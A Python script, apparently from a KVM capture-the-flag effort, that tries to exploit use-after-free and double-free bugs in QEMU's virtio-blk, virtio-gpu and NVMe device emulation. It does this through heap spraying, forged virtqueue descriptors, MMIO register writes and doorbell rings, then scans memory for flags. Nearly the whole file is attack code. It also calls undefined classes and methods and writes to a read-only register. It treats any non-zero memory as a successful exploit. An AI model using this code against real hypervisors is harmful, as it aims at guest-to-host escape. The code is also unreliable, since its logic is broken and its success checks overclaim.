#!/usr/bin/env python3
"""
KVM CTF Vulnerability-Specific Exploiter v7.0
FOCUSED EXPLOITATION BASED ON ACTUAL CODE ANALYSIS
"""

import os
import sys
import json
import struct
import time
import re
from pathlib import Path
from typing import List, Optional
import subprocess

# Colors
class C:
    R = '\033[91m'; G = '\033[92m'; Y = '\033[93m'; B = '\033[94m'
    M = '\033[95m'; CY = '\033[96m'; W = '\033[97m'; E = '\033[0m'
    BOLD = '\033[1m'

def log(msg, level="info"):
    prefix = {"info": f"{C.B}[*]{C.E}", "ok": f"{C.G}[+]{C.E}", 
              "warn": f"{C.Y}[!]{C.E}", "err": f"{C.R}[-]{C.E}",
              "exploit": f"{C.M}[EXPLOIT]{C.E}", "code": f"{C.CY}[CODE]{C.E}"}
    print(f"{prefix.get(level, '[?]')} {msg}")

# ============================================================================
# CODE ANALYZER - Understand the Actual Vulnerability
# ============================================================================

class CodeAnalyzer:
    def __init__(self, qemu_src="/tmp/qemu-src"):
        self.qemu_src = Path(qemu_src)
    
    def analyze_vulnerability(self, finding) -> dict:
        """Deep analysis of a specific vulnerability"""
        file_path = self.qemu_src / finding.file
        if not file_path.exists():
            return {"error": "File not found"}
        
        with open(file_path, 'r') as f:
            lines = f.readlines()
        
        # Get context around the vulnerability
        start = max(0, finding.line - 20)
        end = min(len(lines), finding.line + 20)
        context = lines[start:end]
        
        analysis = {
            "file": finding.file,
            "line": finding.line,
            "type": finding.type,
            "function": finding.function,
            "context": context,
            "vuln_line": lines[finding.line-1] if finding.line <= len(lines) else "",
            "calls": [],
            "triggers": [],
            "allocation_size": None,
            "free_pattern": None,
            "use_pattern": None
        }
        
        # Analyze the specific line
        vuln_line = lines[finding.line-1].strip() if finding.line <= len(lines) else ""
        
        if finding.type == "use_after_free":
            analysis.update(self._analyze_uaf(lines, finding.line, finding.function))
        elif finding.type == "double_free":
            analysis.update(self._analyze_double_free(lines, finding.line, finding.function))
        
        return analysis
    
    def _analyze_uaf(self, lines, line_num, function):
        """Analyze a use-after-free vulnerability"""
        result = {}
        
        # Find the free()
        for i in range(line_num-1, max(0, line_num-50), -1):
            line = lines[i].strip()
            if f'free({function})' in line or f'g_free({function})' in line:
                result["free_line"] = (i+1, line)
                # Look for allocation before free
                for j in range(i-1, max(0, i-20), -1):
                    alloc_line = lines[j].strip()
                    if 'g_malloc' in alloc_line or 'g_new' in alloc_line or 'malloc' in alloc_line:
                        result["alloc_line"] = (j+1, alloc_line)
                        
                        # Extract size
                        match = re.search(r'g_malloc\s*\(\s*(\d+)\s*\)', alloc_line)
                        if match:
                            result["allocation_size"] = int(match.group(1))
                        break
                break
        
        # Find the use after free
        for i in range(line_num, min(len(lines), line_num+50)):
            line = lines[i].strip()
            if f'{function}->' in line or f'{function}[' in line:
                result["use_line"] = (i+1, line)
                break
        
        return result
    
    def _analyze_double_free(self, lines, line_num, function):
        """Analyze a double-free vulnerability"""
        result = {}
        
        # Find both free() calls
        free_count = 0
        free_lines = []
        
        for i in range(max(0, line_num-100), min(len(lines), line_num+100)):
            line = lines[i].strip()
            if f'free({function})' in line or f'g_free({function})' in line:
                free_count += 1
                free_lines.append((i+1, line))
        
        result["free_calls"] = free_lines
        
        # Check if there's reassignment between frees
        if len(free_lines) >= 2:
            first_free = free_lines[0][0]
            second_free = free_lines[1][0]
            
            between_lines = lines[first_free:second_free-1]
            reassigned = any(f'{function} = ' in line for line in between_lines)
            result["reassigned_between"] = reassigned
        
        return result

# ============================================================================
# VULNERABILITY-SPECIFIC EXPLOITER
# ============================================================================

class VulnerabilitySpecificExploiter:
    def __init__(self, tester, target_addr=0x64279a8):
        self.tester = tester
        self.target_addr = target_addr
        self.analyzer = CodeAnalyzer()
    
    def exploit_finding(self, finding):
        """Exploit based on actual code analysis"""
        
        log(f"Analyzing {finding.file}:{finding.line} - {finding.type} of {finding.function}", "code")
        
        # Step 1: Analyze the code
        analysis = self.analyzer.analyze_vulnerability(finding)
        
        # Step 2: Route to specific exploit
        if 'virtio-blk.c' in finding.file:
            return self.exploit_virtio_blk(finding, analysis)
        elif 'virtio-gpu' in finding.file:
            return self.exploit_virtio_gpu(finding, analysis)
        elif 'nvme' in finding.file:
            return self.exploit_nvme(finding, analysis)
        else:
            return self.exploit_generic(finding, analysis)
    
    # ========================================================================
    # VIRTIO-BLK SPECIFIC EXPLOITATION
    # ========================================================================
    
    def exploit_virtio_blk(self, finding, analysis):
        """Exploit virtio-blk vulnerabilities specifically"""
        
        log(f"VIRTIO-BLK exploit: {finding.file}:{finding.line}", "exploit")
        
        # Print the actual vulnerable code
        print(f"\n{C.CY}=== Vulnerable Code ==={C.E}")
        for i, line in enumerate(analysis.get("context", [])):
            line_num = max(0, finding.line - 20) + i + 1
            marker = ">>>" if line_num == finding.line else "   "
            print(f"{marker} {line_num:4}: {line.rstrip()}")
        
        # Based on line number, use specific strategies
        line_num = finding.line
        
        if line_num == 88:  # First UAF in virtio-blk.c
            return self._exploit_virtio_blk_line_88()
        elif line_num == 131:
            return self._exploit_virtio_blk_line_131()
        elif line_num == 714:  # Double free
            return self._exploit_virtio_blk_double_free()
        
        # Default for unknown lines
        return self._exploit_virtio_blk_generic(finding)
    
    def _exploit_virtio_blk_line_88(self):
        """Specific exploit for virtio-blk.c:88"""
        
        log("Strategy: Early request UAF during initialization", "exploit")
        
        # Step 1: Initialize virtio-blk device
        log("1. Initializing virtio-blk MMIO...", "info")
        
        # Virtio MMIO registers (typical)
        VIRTIO_MMIO_MAGIC = 0xfebd2000
        VIRTIO_MMIO_VERSION = VIRTIO_MMIO_MAGIC + 0x04
        VIRTIO_MMIO_DEVICE_ID = VIRTIO_MMIO_MAGIC + 0x08
        VIRTIO_MMIO_VENDOR_ID = VIRTIO_MMIO_MAGIC + 0x0c
        VIRTIO_MMIO_HOST_FEATURES = VIRTIO_MMIO_MAGIC + 0x10
        VIRTIO_MMIO_QUEUE_NUM_MAX = VIRTIO_MMIO_MAGIC + 0x34
        VIRTIO_MMIO_QUEUE_PFN = VIRTIO_MMIO_MAGIC + 0x38
        
        # Write to MMIO to trigger device init
        self.tester.write_dword(VIRTIO_MMIO_MAGIC, 0x74726976)  # "virt" magic
        self.tester.write_dword(VIRTIO_MMIO_VERSION, 2)
        self.tester.write_dword(VIRTIO_MMIO_DEVICE_ID, 2)  # VIRTIO_ID_BLOCK
        self.tester.write_dword(VIRTIO_MMIO_VENDOR_ID, 0xffff)
        
        # Step 2: Spray heap with target pointers at likely request allocation spots
        log("2. Heap spraying for VirtioBlockReq structures...", "info")
        
        # VirtioBlockReq is ~72 bytes. Spray multiple sizes.
        for size in [72, 80, 96, 128]:
            spray = struct.pack('<Q', self.target_addr) * (size // 8)
            for addr in [0x200000, 0x210000, 0x220000, 0x230000]:
                self.tester.write_physical(addr, spray)
        
        # Step 3: Trigger request allocation/free
        log("3. Triggering request processing...", "info")
        
        # Setup a virtqueue
        # Queue 0 is usually the request queue for virtio-blk
        self.tester.write_dword(VIRTIO_MMIO_MAGIC + 0x30, 0)  # Select queue 0
        self.tester.write_dword(VIRTIO_MMIO_MAGIC + 0x38, 0x200000 >> 12)  # Queue PFN
        
        # Add descriptor to queue (simplified)
        desc_addr = 0x300000
        desc = struct.pack('<QQHBB',
            self.target_addr,  # addr
            512,               # len (sector size)
            1,                 # flags (VIRTQ_DESC_F_NEXT)
            0, 0               # next, padding
        )
        self.tester.write_physical(desc_addr, desc)
        
        # Notify the device
        self.tester.write_dword(VIRTIO_MMIO_MAGIC + 0x10, 0)
        
        # Step 4: Check for success
        time.sleep(0.1)
        return self._check_exploit_result()
    
    def _exploit_virtio_blk_double_free(self):
        """Exploit double free in virtio-blk"""
        
        log("Strategy: Double-free in request completion", "exploit")
        
        # Double free often happens in completion path
        # Need to trigger request completion twice
        
        # Step 1: Setup multiple requests
        log("1. Setting up multiple virtio-blk requests...", "info")
        
        # Create several request structures
        req_size = 72  # Approximate VirtioBlockReq size
        for i in range(10):
            addr = 0x400000 + i * 0x1000
            # Fake request structure
            req = struct.pack('<QQQQQQQQQ',
                self.target_addr,      # sector
                1,                     # nb_sectors
                0,                     # data
                0,                     # qiov
                0,                     # in_len
                0,                     # out_len
                0,                     # status
                0,                     # is_write
                0                      # next
            )
            self.tester.write_physical(addr, req)
        
        # Step 2: Trigger completions rapidly
        log("2. Triggering rapid completions...", "info")
        
        # Write to used ring to signal completions
        used_ring_addr = 0x500000
        
        # Multiple used ring entries
        for i in range(5):
            used_elem = struct.pack('<IH',
                i * 0x1000,  # id (matches our fake requests)
                72           # len (request size)
            )
            self.tester.write_physical(used_ring_addr + i*8, used_elem)
        
        # Update used idx
        self.tester.write_dword(used_ring_addr + 0x100, 5)  # 5 entries used
        
        # Step 3: Notify device multiple times
        base = 0xfebd2000
        for _ in range(10):
            self.tester.write_dword(base + 0x10, 0)  # Queue notify
            time.sleep(0.01)
        
        return self._check_exploit_result()
    
    # ========================================================================
    # VIRTIO-GPU SPECIFIC EXPLOITATION
    # ========================================================================
    
    def exploit_virtio_gpu(self, finding, analysis):
        """Exploit virtio-gpu vulnerabilities"""
        
        log(f"VIRTIO-GPU exploit: {finding.file}:{finding.line}", "exploit")
        
        # Virtio-gpu uses 3D commands and resources
        # Common vulnerabilities in command processing
        
        line_num = finding.line
        
        if 'virtio-gpu-virgl.c' in finding.file and line_num == 1010:
            return self._exploit_virtio_gpu_virgl_cmd()
        elif 'virtio-gpu.c' in finding.file:
            if line_num == 282 or line_num == 308:
                return self._exploit_virtio_gpu_resource_uaf()
        
        return self._exploit_virtio_gpu_generic()
    
    def _exploit_virtio_gpu_virgl_cmd(self):
        """Exploit virgl command UAF"""
        
        log("Strategy: Virgl 3D command UAF", "exploit")
        
        # Step 1: Setup GPU resources
        log("1. Creating GPU resources...", "info")
        
        # Write resource creation command
        cmd_addr = 0x600000
        cmd = struct.pack('<IIQQ',
            0x1000,          # VIRTIO_GPU_CMD_RESOURCE_CREATE_3D
            0,               # flags
            self.target_addr, # resource_id (points to our target)
            0x1000           # size
        )
        self.tester.write_physical(cmd_addr, cmd)
        
        # Step 2: Spray command buffers
        log("2. Spraying command buffers...", "info")
        
        # Command buffers are typically ~4096 bytes
        spray = struct.pack('<Q', self.target_addr) * 512
        for addr in [0x610000, 0x620000, 0x630000, 0x640000]:
            self.tester.write_physical(addr, spray)
        
        # Step 3: Trigger command processing
        log("3. Triggering GPU command processing...", "info")
        
        # Write to virtio-gpu control queue
        base = 0xfebd3000  # virtio2 (often GPU)
        self.tester.write_dword(base + 0x30, 0)  # Select control queue
        self.tester.write_dword(base + 0x10, 0)  # Notify
        
        return self._check_exploit_result()
    
    # ========================================================================
    # NVME SPECIFIC EXPLOITATION
    # ========================================================================
    
    def exploit_nvme(self, finding, analysis):
        """Exploit NVMe vulnerabilities"""
        
        log(f"NVMe exploit: {finding.file}:{finding.line}", "exploit")
        
        # NVMe uses submission and completion queues
        # Common vulnerabilities in admin commands
        
        line_num = finding.line
        
        if 'ctrl.c' in finding.file:
            return self._exploit_nvme_admin_cmd()
        elif 'ns.c' in finding.file:
            return self._exploit_nvme_io_cmd()
        
        return self._exploit_nvme_generic()
    
    def _exploit_nvme_admin_cmd(self):
        """Exploit NVMe admin command vulnerabilities"""
        
        log("Strategy: NVMe admin command UAF", "exploit")
        
        # NVMe controller registers
        NVME_BASE = 0xfebd6000
        
        # Step 1: Setup admin submission queue
        log("1. Setting up admin submission queue...", "info")
        
        sq_addr = 0x700000
        # Admin command: Identify Controller
        cmd = struct.pack('<IIQQQQQQ',
            0x06,            # Identify (opcode)
            0, 0, 0, 0, 0, 0, 0  # Other fields
        )
        self.tester.write_physical(sq_addr, cmd)
        
        # Step 2: Configure controller
        self.tester.write_dword(NVME_BASE + 0x14, sq_addr >> 2)  # AQA - admin queue attr
        self.tester.write_dword(NVME_BASE + 0x24, sq_addr)       # ASQ - admin submission queue
        
        # Step 3: Enable controller
        self.tester.write_dword(NVME_BASE + 0x04, 0x460001)      # CC - enable
        
        # Step 4: Spray admin queue memory
        spray = struct.pack('<Q', self.target_addr) * 128
        for addr in [0x710000, 0x720000, 0x730000]:
            self.tester.write_physical(addr, spray)
        
        # Step 5: Ring doorbell
        self.tester.write_dword(NVME_BASE + 0x1000, 1)  # Admin SQ doorbell
        
        return self._check_exploit_result()
    
    # ========================================================================
    # UTILITY FUNCTIONS
    # ========================================================================
    
    def _exploit_virtio_blk_generic(self, finding):
        """Generic virtio-blk exploit when specific line isn't known"""
        
        log("Generic virtio-blk exploitation", "exploit")
        
        # Multiple strategies
        strategies = [
            self._trigger_virtio_blk_read,
            self._trigger_virtio_blk_write,
            self._trigger_virtio_blk_flush,
            self._trigger_virtio_blk_discard
        ]
        
        for strategy in strategies:
            result = strategy()
            if result.success:
                return [result]
        
        return [ExploitResult(success=False, device="virtio-blk", method="generic")]
    
    def _trigger_virtio_blk_read(self):
        """Trigger a read request"""
        log("Triggering read request...", "info")
        
        # Setup read command in request
        req_addr = 0x800000
        req = struct.pack('<QQQQQQQQQ',
            0,                     # sector 0
            1,                     # 1 sector
            self.target_addr,      # data buffer
            0, 0, 0, 0, 0, 0      # other fields
        )
        self.tester.write_physical(req_addr, req)
        
        # Notify
        self.tester.write_dword(0xfebd2000 + 0x10, 0)
        
        return self._check_exploit_result()
    
    def _check_exploit_result(self):
        """Check if exploit succeeded"""
        data = self.tester.read_physical(self.target_addr, 256)
        if data:
            # Check for flag patterns
            for pattern in [b'flag{', b'FLAG{', b'CTF{']:
                if pattern in data:
                    start = data.find(pattern)
                    end = data.find(b'}', start)
                    if end != -1:
                        flag = data[start:end+1].decode('ascii', errors='ignore')
                        return ExploitResult(
                            success=True,
                            device="exploit",
                            method="specific",
                            flag_found=flag
                        )
            
            # Check if memory was modified
            if data != b'\x00' * len(data):
                return ExploitResult(
                    success=True,
                    device="exploit",
                    method="specific",
                    details=f"Memory modified: {data[:32].hex()}...",
                    wrote_bytes=len(data)
                )
        
        return ExploitResult(success=False, device="exploit", method="specific")
    
    # ========================================================================
    # MAIN EXPLOITATION FLOW
    # ========================================================================
    
    def exploit_all(self, scan_results):
        """Main exploitation flow - vulnerability specific"""
        
        log(f"Starting vulnerability-specific exploitation...", "exploit")
        
        results = []
        
        # Process devices in order of critical findings
        for device, result in sorted(scan_results.items(),
                                   key=lambda x: len(x[1].get_critical()),
                                   reverse=True):
            
            critical = result.get_critical()
            if not critical:
                continue
            
            log(f"\n{C.M}=== {device.upper()} - {len(critical)} critical ==={C.E}", "exploit")
            
            # Focus on top 3 most critical per device
            for i, finding in enumerate(critical[:3]):
                log(f"Finding {i+1}: {finding.short_file}:{finding.line} - {finding.type}", "info")
                
                # Exploit this specific finding
                exploit_results = self.exploit_finding(finding)
                results.extend(exploit_results)
                
                # Stop if we got a flag
                for r in exploit_results:
                    if r.flag_found:
                        log(f"FLAG FOUND: {r.flag_found}", "ok")
                        return results
        
        return results

# ============================================================================
# INTEGRATION WITH YOUR EXISTING CODE
# ============================================================================

# To integrate with your existing script, replace the TargetedExploiter class
# with VulnerabilitySpecificExploiter in your main() function:

"""
In your main() function, change:

exploiter = TargetedExploiter(tester, target_addr, verbose=True)
# to:
exploiter = VulnerabilitySpecificExploiter(tester, target_addr)

And change:
exploiter.exploit_all_findings(scan_results)
# to:
exploiter.exploit_all(scan_results)
"""

# ============================================================================
# QUICK DIAGNOSTIC SCRIPT
# ============================================================================

def run_diagnostic():
    """Quick test to see what works"""
    
    print(f"{C.M}=== KVM CTF Diagnostic ==={C.E}")
    
    # Import your tester
    try:
        from kvm_probe_interface import KVMProbe
        tester = KVMProbe(verbose=True)
        
        if not tester.test_connection():
            print(f"{C.R}[-] Cannot connect{C.E}")
            return
        
        # Test basic memory access
        print(f"\n{C.B}[*] Testing memory access...{C.E}")
        test_addr = 0x1000
        data = tester.read_physical(test_addr, 64)
        if data:
            print(f"{C.G}[+] Can read memory{C.E}")
            print(f"   0x{test_addr:x}: {data[:32].hex()}...")
        else:
            print(f"{C.R}[-] Cannot read memory{C.E}")
        
        # Test hypercalls
        print(f"\n{C.B}[*] Testing hypercalls...{C.E}")
        batch = tester.hypercall_batch()
        if batch:
            print(f"{C.G}[+] Found {len(batch)} hypercalls{C.E}")
            for nr, val in list(batch.items())[:10]:
                print(f"   HC{nr}: 0x{val:016x}")
        else:
            print(f"{C.R}[-] No hypercalls found{C.E}")
        
        # Check for flags at common addresses
        print(f"\n{C.B}[*] Checking for flags...{C.E}")
        flag_addrs = [0x64279a8, 0x1000, 0x7c00, 0x200000]
        for addr in flag_addrs:
            data = tester.read_physical(addr, 256)
            if data:
                text = data.decode('ascii', errors='ignore')
                if 'flag' in text.lower() or 'ctf' in text.lower():
                    print(f"{C.G}[+] Possible flag at 0x{addr:x}{C.E}")
                    print(f"   {text[:100]}...")
        
        tester.close()
        
    except Exception as e:
        print(f"{C.R}[-] Error: {e}{C.E}")

if __name__ == "__main__":
    run_diagnostic()